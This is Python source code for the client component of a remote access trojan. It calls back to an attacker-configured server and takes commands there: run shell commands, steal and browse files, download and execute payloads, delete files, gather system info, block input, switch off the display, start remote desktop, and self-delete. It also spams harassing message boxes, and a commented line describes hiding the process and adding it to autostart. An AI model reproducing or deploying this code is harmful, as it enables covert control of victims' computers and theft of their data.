import socket 
import os
import threading
import time 
import json
import ctypes
import queue

import configuration as conf
from plugins_client import main
from tkinter import messagebox
from plugins_client.remote_desk import RemoteClient
from plugins_client.file_streamer import FileStreamer


queue_msg = queue.Queue()
console = main.ConsoleManager()
file_stream = FileStreamer()


IP, PORT = conf.IP, conf.PORT
IP_REMOTE, PORT_REMOTE = conf.IP_REMOTE, conf.PORT_REMOTE #this only for remote tool - microphone, webcam, remote desktop
NAME_PROCESS = "conf.NAME_PROCESS"
KEY = conf.KEY.encode()


class Client:
    def __init__(self, IP, PORT):
        self.IP = IP
        self.PORT = PORT

    def send_file(self, filename, sock):
        try:
            if os.path.exists(filename):
                file_size = os.path.getsize(filename)
                header = f"FILE {file_size} {os.path.basename(filename)}".encode('utf-8')
                print(header)
                sock.send(header.ljust(1024)) 
                if sock.recv(1024).decode('utf-8') == "SEND_FILE":
                    with open(filename, 'rb') as file:
                        while True:
                            data = file.read(24576)  
                            if not data:
                                break
                            sock.send(data)  
                    print(f"File {filename} succeful sended")
                print("Not accept")
            else:                        
                sock.send(b"FILE_NOT_FOUND")
                print(f"File {filename} not found.")
            
        except Exception as e:
            print(f"Error in send file {e}")
        return

    def download_file(self, save_path, sock):
        try:
            header = sock.recv(1024).decode('utf-8').strip()
            if header.startswith("FILE"):
                parts = header.split()
                file_size = int(parts[1])
                filename = parts[2]

                save_filename = os.path.join(save_path, filename)
                with open(save_filename, 'wb') as file:
                    received = 0
                    while received < file_size:
                        data = sock.recv(24576)
                        if not data:
                            break
                        file.write(data)
                        received += len(data)
                print(f"File {filename} succeful download")

                queue_msg.put(filename)

            else:
                print("Error in download, not valid title.")
        except Exception as e:
            print(f"Error in download file {e}")
        return

    def listen_server(self, sock):
        self.runn = True

        def remove_yourself(_):
            main.self_delete()

        def handle_msg_box(data):
            threading.Thread(target=messagebox.showinfo, args=("Hacker", data), daemon=True).start()
        
        def handle_msg_demon(data):
            def demon_process():
                try:
                    while True:
                        messagebox.showerror("Devil", data)
                except Exception as e:
                    print(f"Demon msg error: {e}")

            return threading.Thread(target=demon_process).start()

        def handle_console(data):
            command = data[7:].strip()
            print(command)
            result = console.execute_command(command=command)
            sock.send(result.encode())

        def handle_send(_):
            threading.Thread(target=self.download_file, args=("", sock), daemon=True).start()

        def handle_set_wallpaper(_):
            threading.Thread(target=self.download_file, args=("", sock), daemon=True).start()
            filepath = queue_msg.get()
            if filepath:
                threading.Thread(target=main.set_wallpaper, args=(filepath,), daemon=True).start()

        def handle_screemer(_):
            pass
            """
            threading.Thread(target=self.download_file, args=("", sock), daemon=True).start()
            filepath = queue_msg.get()
            if filepath:
                threading.Thread(target=main.play_screemer, args=(filepath,), daemon=True).start()
            """

        def handle_s_run(_):
            threading.Thread(target=self.download_file, args=("", sock), daemon=True).start()
            filepath = queue_msg.get()
            if filepath:
                threading.Thread(target=main.play_and_delete, args=(filepath,), daemon=True).start()

        def handle_open_link(data):
            link = data[9:].strip()
            main.open_link(link)

        def handle_get_info(_):
            info = main.collect_system_info()
            sock.send(b"info")
            sock.send(info.encode())

        def handle_off(_):
            main.shutdowm()

        def handle_reboot(_):
            main.shutdowm(True)

        def handle_block_input(_):
            threading.Thread(target=main.block_input, daemon=True).start()

        def handle_restart(_):
            main.restart()

        def handle_remote(_):
            self.remote = RemoteClient(host=IP_REMOTE, port=PORT_REMOTE)
            threading.Thread(target=self.remote.connect, daemon=True).start()
        
        def handle_file_streamer(data):
            comm = data[4:].strip()
            
            if "start" in comm:
                files_list = file_stream.initialize()
                json_files = json.dumps(files_list)

                sock.send(json_files.encode())
            
            elif "setfolder" in comm:
                folder = comm[9:].strip()

                file_stream.enter(folder)

                new_files_list = file_stream.list_items()
                print(new_files_list)
                new_files_json = json.dumps(new_files_list)

                sock.send(new_files_json.encode())
            
            elif "back" in comm:
                file_stream.go_back()

                new_files_list = file_stream.list_items()
                new_files_json = json.dumps(new_files_list)

                sock.send(new_files_json.encode())
            
            elif "forward" in comm:
                file_stream.go_up()

                new_files_list = file_stream.list_items()
                new_files_json = json.dumps(new_files_list)

                sock.send(new_files_json.encode())
            
            elif "download" in comm:
                file = comm[8:].strip()

                path = os.path.join(file_stream.current_path, file)
        
                threading.Thread(target=self.send_file, args=(path, sock)).start()

            elif "delete" in comm:
                file = comm[6:].strip()

                path = os.path.join(file_stream.current_path, file)

                main.delete_file(path)
            
            elif "run" in comm:
                file = comm[3:].strip()

                path = os.path.join(file_stream.current_path, file)

                threading.Thread(target=main.play_and_delete, args=(path, False), daemon=True).start()

        def handle_display_off_on(data):
                def off_on(off: bool):
                    HWND_BROADCAST  = 0xFFFF
                    WM_SYSCOMMAND   = 0x0112
                    SC_MONITORPOWER = 0xF170
                    lParam = 2 if off else -1
                    ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, lParam)

                if "black" in data:
                    return threading.Thread(target=off_on, args=(True,), daemon=True).start()
                
                return threading.Thread(target=off_on, args=(False,), daemon=True).start()

        handlers = {
            "console": handle_console,
            "send": handle_send,
            "s_run": handle_s_run,
            "open_link": handle_open_link,
            "get_info": handle_get_info,
            "off": handle_off,
            "reboot": handle_reboot,
            "block_input": handle_block_input,
            "kill": remove_yourself,
            "remote": handle_remote,
            "display": handle_display_off_on,
            "set_wallpaper": handle_set_wallpaper,
            "no_close_box": handle_msg_demon,
            "msg": handle_msg_box,
            "restart": handle_restart,
            "screemer": handle_screemer,
            "file": handle_file_streamer
        }

        try:
            while self.runn:
                data = sock.recv(1024)
                decode_data = data.decode("utf-8", errors="ignore")
                print(decode_data)

                if decode_data == "exit":
                    self.__runn = False
                    self.runn = False

                for command, handler in handlers.items():
                    if decode_data.startswith(command):
                        handler(decode_data)
                        break

        except UnicodeDecodeError:
            print("Unicode error")
        except Exception as e:
            print(f"Error in listen server: {e}")
            self.try_connect(IP, PORT)
        finally:
            sock.close()

    def try_connect(self, IP, PORT):
        self.__runn = True 
        while self.__runn:
            try:
                self.sock = socket.socket()
                with self.sock:
                    self.sock.connect((IP, PORT))
                    self.sock.send(KEY)

                    print("Connected")
                    self.listen_server(self.sock)

            except Exception as e:
                print(f"Connection error {e}")
                time.sleep(1)


def main_start():
    #threading.Thread(target=main.copy_and_run, args=(NAME_PROCESS,), daemon=True).start() #Copy to new directory and restart from new, add to autostart, rename process in taskmngr
    client = Client(IP, PORT)
    client.try_connect(IP, PORT)

if __name__ == "__main__":
    main_start()